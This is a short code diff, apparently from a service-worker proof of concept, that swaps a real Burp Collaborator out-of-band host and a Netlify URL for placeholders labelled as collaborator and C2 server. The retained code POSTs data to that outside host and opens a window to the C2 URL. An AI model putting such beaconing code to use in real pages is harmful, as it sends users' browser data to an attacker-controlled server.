@@ -1,4 +1,4 @@
-  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
+  const OOB = 'https://YOUR_COLLABORATOR_ID.oastify.com';
   const ping = (tag, data) => fetch(OOB + '/sw_side/' + tag, {
     method: 'POST', mode: 'no-cors',
     body: JSON.stringify(data ?? {})
@@ -106,7 +106,7 @@
 
     // clients.openWindow() — demo, opens a new tab
     if (e.data?.type === 'demo_openWindow') {
-      const newClient = await clients.openWindow('https://gleeful-creponne-8ff162.netlify.app/');
+      const newClient = await clients.openWindow('https://YOUR_C2_SERVER.example.com/');
       ping('clients.openWindow', { opened: newClient?.url });
     }
   });
